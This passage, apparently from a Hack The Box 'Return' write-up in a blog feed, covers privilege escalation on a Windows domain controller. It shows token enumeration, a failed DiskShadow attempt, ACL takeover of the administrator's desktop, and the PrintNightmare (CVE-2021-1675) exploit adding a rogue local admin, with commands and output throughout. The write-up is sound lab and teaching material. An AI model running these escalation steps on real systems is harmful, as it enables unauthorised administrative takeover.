-</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
-<h3 id="administrative-access">Administrative Access</h3>
-<h4 id="enumeration-1">Enumeration</h4>
-<p>Checking user&rsquo;s privileges with <code>whoami</code> reveals that <code>svc-printer</code> is a member of Server Operators and Print Operators. There are also some access tokens that can be abused.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>esktop&gt; whoami /all
-
-USER INFORMATION
-----------------
-
-User Name          <span class="nv">SID</span>
-<span class="o">==================</span> <span class="o">=============================================</span>
-<span class="k">return</span><span class="se">\s</span>vc-printer S-1-5-21-3750359090-2939318659-876128439-1103
-
-
-GROUP INFORMATION
------------------
-
-Group Name                                 Type             SID          <span class="nv">Attributes</span>
-<span class="o">==========================================</span> <span class="o">================</span> <span class="o">============</span> <span class="o">==================================================</span>
-Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
-BUILTIN<span class="se">\S</span>erver Operators                   Alias            S-1-5-32-549 Mandatory group, Enabled by default, Enabled group
-BUILTIN<span class="se">\P</span>rint Operators                    Alias            S-1-5-32-550 Mandatory group, Enabled by default, Enabled group
-BUILTIN<span class="se">\R</span>emote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
-BUILTIN<span class="se">\U</span>sers                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
-BUILTIN<span class="se">\P</span>re-Windows <span class="m">2000</span> Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY<span class="se">\N</span>ETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY<span class="se">\A</span>uthenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY<span class="se">\T</span>his Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY<span class="se">\N</span>TLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
-Mandatory Label<span class="se">\H</span>igh Mandatory Level       Label            S-1-16-12288
-
-
-PRIVILEGES INFORMATION
-----------------------
-
-Privilege Name                Description                         <span class="nv">State</span>
-<span class="o">=============================</span> <span class="o">===================================</span> <span class="o">=======</span>
-SeMachineAccountPrivilege     Add workstations to domain          Enabled
-SeLoadDriverPrivilege         Load and unload device drivers      Enabled
-SeSystemtimePrivilege         Change the system <span class="nb">time</span>              Enabled
-SeBackupPrivilege             Back up files and directories       Enabled
-SeRestorePrivilege            Restore files and directories       Enabled
-SeShutdownPrivilege           Shut down the system                Enabled
-SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
-SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
-SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set</span>      Enabled
-SeTimeZonePrivilege           Change the <span class="nb">time</span> zone                Enabled
-
-
-USER CLAIMS INFORMATION
------------------------
-
-User claims unknown.
-
-Kerberos support <span class="k">for</span> Dynamic Access Control on this device has been disabled.
-</code></pre></div><p>According to this <a href="https://ss64.com/nt/syntax-security_groups.html">site</a>, <strong>Server Operators</strong> is:</p>
-<blockquote>
-<p>A built-in group that exists only on domain controllers. By default, the group has no members. Server Operators can log on to a server interactively; create and delete network shares; start and stop services; back up and restore files; format the hard disk of the computer; and shut down the computer.</p>
-</blockquote>
-<p>I can say that <strong>Server Operators</strong> is the ultimate version of <strong>Backup Operators</strong>.</p>
-<p>As for Print Operators, I&rsquo;ll remember from HTB: Fuse that it can be exploited by loading a malicious driver using <code>SeLoadDriverPrivilege</code>. I don&rsquo;t demo it here, so see <a href="https://0xdf.gitlab.io/2020/10/31/htb-fuse.html#priv-svc-print--system">this awesome post</a> by 0xdf instead.</p>
-<p>Further enumeration reveals that Print Spooler is running ( ͡° ͜ʖ ͡°).</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>esktop&gt; Get-Service -Name Spooler
-
-Status   Name               DisplayName
-------   ----               -----------
-Running  Spooler            Print Spooler
-</code></pre></div><h4 id="diskshadow-failed">DiskShadow (failed)</h4>
-<p>The back up and restore files involve two access tokens: <code>SeBackupPrivilege</code> and <code>SeRestorePrivilege</code>. These tokens were previously abused to dump AD database (NTDS.d) in <a href="https://fahmifj.github.io/hackthebox/blackfield/#shell-as-administrator">HTB: Blackfield</a>.</p>
-<p>I tried to reproduce the attack here, but I got the following results.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt; diskshadow /s script.txt
-Microsoft DiskShadow version 1.0
-Copyright <span class="o">(</span>C<span class="o">)</span> <span class="m">2013</span> Microsoft Corporation
-On computer:  PRINTER,  10/16/2021 1:24:40 PM
-
--&gt; <span class="nb">set</span> context persistent nowriters
--&gt; add volume c: <span class="nb">alias</span> iamf
-
-COM call <span class="s2">&#34;(*vssObject)-&gt;InitializeForBackup&#34;</span> failed.
-</code></pre></div><p>The intended way, according to the official writeup, is to abuse the <code>Server Operators</code> ability to start/stop/modify services, but I&rsquo;ll put that aside.</p>
-<h4 id="acl-full-access">ACL Full Access</h4>
-<p>There is another way that still involves the <code>SeBackupPrivilege</code> and <code>SeRestorePrivilege</code>. It&rsquo;s to modify ACL and grant myself full access to the file/folder I specified using <a href="https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1">this PowerShell script</a>. In the following, I use that script to own the entire admin&rsquo;s desktop folder.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt;Acl-FullControl -user <span class="k">return</span><span class="se">\s</span>vc-printer -path c:<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop
-<span class="o">[</span>+<span class="o">]</span> Current permissions:
-
-
-Path   : Microsoft.PowerShell.Core<span class="se">\F</span>ileSystem::C:<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop
-Owner  : BUILTIN<span class="se">\A</span>dministrators
-Group  : RETURN<span class="se">\D</span>omain Users
-Access : NT AUTHORITY<span class="se">\S</span>YSTEM Allow  FullControl
-         BUILTIN<span class="se">\A</span>dministrators Allow  FullControl
-         RETURN<span class="se">\A</span>dministrator Allow  FullControl
-Audit  :
-Sddl   : O:BAG:DUD:<span class="o">(</span>A<span class="p">;</span>OICIID<span class="p">;</span>FA<span class="p">;;;</span>SY<span class="o">)(</span>A<span class="p">;</span>OICIID<span class="p">;</span>FA<span class="p">;;;</span>BA<span class="o">)(</span>A<span class="p">;</span>OICIID<span class="p">;</span>FA<span class="p">;;;</span>LA<span class="o">)</span>
-
-
-
-<span class="o">[</span>+<span class="o">]</span> Changing permissions to c:<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop
-<span class="o">[</span>+<span class="o">]</span> Acls changed successfully.
-
-
-Path   : Microsoft.PowerShell.Core<span class="se">\F</span>ileSystem::C:<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop
-Owner  : BUILTIN<span class="se">\A</span>dministrators
-Group  : RETURN<span class="se">\D</span>omain Users
-Access : RETURN<span class="se">\s</span>vc-printer Allow  FullControl
-         NT AUTHORITY<span class="se">\S</span>YSTEM Allow  FullControl
-         BUILTIN<span class="se">\A</span>dministrators Allow  FullControl
-         RETURN<span class="se">\A</span>dministrator Allow  FullControl
-Audit  :
-Sddl   : O:BAG:DUD:AI<span class="o">(</span>A<span class="p">;</span>OICI<span class="p">;</span>FA<span class="p">;;;</span>S-1-5-21-3750359090-2939318659-876128439-1103<span class="o">)(</span>A<span class="p">;</span>OICIID<span class="p">;</span>FA<span class="p">;;;</span>SY<span class="o">)(</span>A<span class="p">;</span>OICIID<span class="p">;</span>FA<span class="p">;;;</span>BA<span class="o">)(</span>A<span class="p">;</span>OICIID<span class="p">;</span>FA<span class="p">;;;</span>LA<span class="o">)</span>
-
-</code></pre></div><p>Now I can read the flag</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt; <span class="nb">type</span> <span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop<span class="se">\r</span>oot.txt
-9f8dd...<span class="o">[</span>SNIP<span class="o">]</span>...
-</code></pre></div><p>I also made the <a href="https://github.com/fahmifj/AAD-scripts/blob/main/Acl-RevokeFullControl.ps1">anti script</a> to revert what I did on the admin&rsquo;s desktop folder.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt; Acl-RevokeFullControl -User <span class="k">return</span><span class="se">\s</span>vc-printer -Path C:<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop
-<span class="o">[</span>+<span class="o">]</span> Current permissions:
-
-
-Path   : Microsoft.PowerShell.Core<span class="se">\F</span>ileSystem::C:<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop
-Owner  : BUILTIN<span class="se">\A</span>dministrators
-Group  : RETURN<span class="se">\D</span>omain Users
-Access : RETURN<span class="se">\s</span>vc-printer Allow  FullControl
-         NT AUTHORITY<span class="se">\S</span>YSTEM Allow  FullControl
-         BUILTIN<span class="se">\A</span>dministrators Allow  FullControl
-         RETURN<span class="se">\A</span>dministrator Allow  FullControl
-Audit  :
-Sddl   : O:BAG:DUD:AI<span class="o">(</span>A<span class="p">;</span>OICI<span class="p">;</span>FA<span class="p">;;;</span>S-1-5-21-3750359090-2939318659-876128439-1103<span class="o">)(</span>A<span class="p">;</span>OICIID<span class="p">;</span>FA<span class="p">;;;</span>SY<span class="o">)(</span>A<span class="p">;</span>OICIID<span class="p">;</span>FA<span class="p">;;;</span>BA<span class="o">)(</span>A<span class="p">;</span>OICIID<span class="p">;</span>FA<span class="p">;;;</span>LA<span class="o">)</span>
-
-
-
-<span class="o">[</span>+<span class="o">]</span> User permissions to remove on C:<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop
-
-
-FileSystemRights  : FullControl
-AccessControlType : Allow
-IdentityReference : RETURN<span class="se">\s</span>vc-printer
-IsInherited       : False
-InheritanceFlags  : ContainerInherit, ObjectInherit
-PropagationFlags  : None
-
-<span class="o">[</span>+<span class="o">]</span> Acls changed successfully.
-
-
-
-Path   : Microsoft.PowerShell.Core<span class="se">\F</span>ileSystem::C:<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop
-Owner  : BUILTIN<span class="se">\A</span>dministrators
-Group  : RETURN<span class="se">\D</span>omain Users
-Access : NT AUTHORITY<span class="se">\S</span>YSTEM Allow  FullControl
-         BUILTIN<span class="se">\A</span>dministrators Allow  FullControl
-         RETURN<span class="se">\A</span>dministrator Allow  FullControl
-Audit  :
-Sddl   : O:BAG:DUD:AI<span class="o">(</span>A<span class="p">;</span>OICIID<span class="p">;</span>FA<span class="p">;;;</span>SY<span class="o">)(</span>A<span class="p">;</span>OICIID<span class="p">;</span>FA<span class="p">;;;</span>BA<span class="o">)(</span>A<span class="p">;</span>OICIID<span class="p">;</span>FA<span class="p">;;;</span>LA<span class="o">)</span>
-
-
-
-*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt; gc <span class="se">\\</span>printer<span class="se">\c</span>$<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop<span class="se">\r</span>oot.txt
-Access to the path <span class="s1">&#39;\\printer\c$\users\administrator\desktop\root.txt&#39;</span> is denied.
-At line:1 char:1
-+ gc <span class="se">\\</span>printer<span class="se">\c</span>$<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop<span class="se">\r</span>oot.txt
-+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-    + CategoryInfo          : PermissionDenied: <span class="o">(</span><span class="se">\\</span>printer<span class="se">\c</span>$<span class="se">\u</span>s...esktop<span class="se">\r</span>oot.txt:String<span class="o">)</span> <span class="o">[</span>Get-Content<span class="o">]</span>, UnauthorizedAccessException
-    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
-</code></pre></div><h4 id="alternative--printnightmare-lpe">(Alternative)  PrintNightmare LPE</h4>
-<p>And here&rsquo;s the ultimate exploit.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt; Import-Module .<span class="se">\C</span>VE-2021-1675.ps1
-*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt; Invoke-Nightmare -NewUser <span class="s2">&#34;choropys&#34;</span> -NewPassword <span class="s2">&#34;ch0ropys!&#34;</span>
-<span class="o">[</span>+<span class="o">]</span> created payload at C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\T</span>emp<span class="se">\n</span>ightmare.dll
-<span class="o">[</span>+<span class="o">]</span> using <span class="nv">pDriverPath</span> <span class="o">=</span> <span class="s2">&#34;C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\mxdwdrv.dll&#34;</span>
-<span class="o">[</span>+<span class="o">]</span> added user choropys as <span class="nb">local</span> administrator
-<span class="o">[</span>+<span class="o">]</span> deleting payload from C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\T</span>emp<span class="se">\n</span>ightmare.dll
-*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt; net user
-
-User accounts <span class="k">for</span> <span class="se">\\</span>
-
--------------------------------------------------------------------------------
-Administrator            choropys                 Guest
-krbtgt                   svc-printer
-The <span class="nb">command</span> completed with one or more errors.
-</code></pre></div><p>The hard way to read the root flag (afaik this won&rsquo;t work if WinRM disabled).</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt; <span class="nv">$username</span> <span class="o">=</span> <span class="s2">&#34;choropys&#34;</span>
-*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt; <span class="nv">$password</span> <span class="o">=</span> ConvertTo-SecureString <span class="s2">&#34;ch0ropys!&#34;</span> -AsPlainText -Force
-*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt; <span class="nv">$cred</span> <span class="o">=</span> new-object -typename System.Management.Automation.PSCredential -argumentlist <span class="nv">$username</span>, <span class="nv">$password</span>
-*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt; Invoke-Command -Computer localhost -Credential <span class="nv">$cred</span> -ScriptBlock <span class="o">{</span> gci C:/users/administrator/desktop/root.txt <span class="o">}</span>
-
-
-    Directory: C:<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop
-
-
-Mode                LastWriteTime         Length Name                                                                                                 PSComputerName
-----                -------------         ------ ----                                                                                                 --------------
--ar---       10/14/2021  10:33 PM             <span class="m">34</span> root.txt                                                                                             localhost
-
-
-*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt; Invoke-Command -Computer localhost -Credential <span class="nv">$cred</span> -ScriptBlock <span class="o">{</span> gc C:/users/administrator/desktop/root.txt <span class="o">}</span>
-9f8dd...<span class="o">[</span>SNIP<span class="o">]</span>...
-</code></pre></div>]]></content:encoded>
     </item>
     
   </channel>
